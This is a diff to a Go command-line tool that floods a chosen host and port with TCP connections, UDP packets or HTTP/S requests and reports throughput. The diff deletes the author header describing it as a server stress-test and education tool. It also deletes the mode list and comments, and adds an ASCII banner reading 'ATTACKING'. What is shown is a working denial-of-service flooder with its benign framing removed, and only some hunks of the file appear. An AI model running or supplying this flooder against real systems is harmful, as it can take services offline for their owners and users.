@@ -1,13 +1,3 @@
-/*
-Coded By lmt206
-Date: 19/9/2022
-|------------------------------------------------|
-|  This tool is a server stress test tool,       |
-|  It is only use for testing server firewall    |
-|  and education.                                |
-|------------------------------------------------|
-Updated: 19/9/2020
-*/
 package main
 
 import (
@@ -115,18 +105,14 @@ func init() {
 }
 
 func main() {
-	fmt.Println("|--------------------------------------|")
-	fmt.Println("|   Golang : Server Stress Test Tool   |")
-	fmt.Println("|          C0d3d By LeMinhTu           |")
-	fmt.Println("|--------------------------------------|")
+	fmt.Println(" █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗ ")
+	fmt.Println("██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝ ")
+	fmt.Println("███████║   ██║      ██║   ███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗")
+	fmt.Println("██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║")
+	fmt.Println("██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝")
+	fmt.Println("╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ")
 	if len(os.Args) != 7 {
 		fmt.Printf("Usage: %s host port mode connections seconds timeout(second)\r\n", os.Args[0])
-		fmt.Println("|--------------------------------------|")
-		fmt.Println("|             Mode List                |")
-		fmt.Println("|     [1] TCP-Connection flood         |")
-		fmt.Println("|     [2] UDP-flood                    |")
-		fmt.Println("|     [3] HTTP-flood(Auto SSL)         |")
-		fmt.Println("|--------------------------------------|")
 		os.Exit(1)
 	}
 
@@ -157,7 +143,7 @@ func main() {
 	addr += ":"
 	addr += os.Args[2]
 	var wg sync.WaitGroup
-	if os.Args[3] == "1" { //Tcp connection flood
+	if os.Args[3] == "1" {
 		payload := "\000"
 		for i := 0; i < connections; i++ {
 			wg.Add(1)
@@ -178,7 +164,7 @@ func main() {
 				}
 				for {
 					if stop > 0 {
-						_, err := s.Write([]byte(payload)) //check if it still alive
+						_, err := s.Write([]byte(payload))
 						if err != nil {
 							errn++
 						} else {
@@ -192,13 +178,13 @@ func main() {
 
 			}(&wg)
 		}
-		time.Sleep(time.Second * time.Duration(times)) //timer
+		time.Sleep(time.Second * time.Duration(times))
 		stop++
 		wg.Wait()
 		fmt.Println("Total connection:", connections)
 		fmt.Println("Connection Alive:", count+1)
 		fmt.Println("Connection Error:", errn, "times")
-	} else if os.Args[3] == "2" { //udpflood
+	} else if os.Args[3] == "2" {
 		bit := 0
 		ip, err := net.LookupIP(os.Args[1])
 		if err != nil {
@@ -235,8 +221,7 @@ func main() {
 		fmt.Println("Total Sent:", bit/1024/1024, "Mb")
 		fmt.Printf("Mbps: %.2f Mb/s\r\n", float64(bit)/1024/1024/float64(times))
 		fmt.Printf("PPS: %.2f packets/s\r\n", float64(count/times+0/5))
-		//fmt.Println("Connection Error:",error,"times")
-	} else if os.Args[3] == "3" { //http/s flood
+	} else if os.Args[3] == "3" {
 		for i := 0; i < connections; i++ {
 			wg.Add(1)
 			go func(wg *sync.WaitGroup) {
@@ -273,3 +258,16 @@ func main() {
 							succ++
 						}
 					}
+				}
+			}(&wg)
+		}
+		time.Sleep(time.Second * time.Duration(times)) //timer
+		stop++
+		wg.Wait()
+		fmt.Println("Total Sent:", count, "requests")
+		fmt.Printf("RPS: %.2f requests/s\r\n", float64(count)/float64(times))
+		fmt.Printf("Successed Rate: %.2f%%\r\n", float64(succ)/float64(count)*100)
+		fmt.Printf("Dropped: %d\r\n", fail)
+		fmt.Println("Connection Error:", errn, "times")
+	}
+}
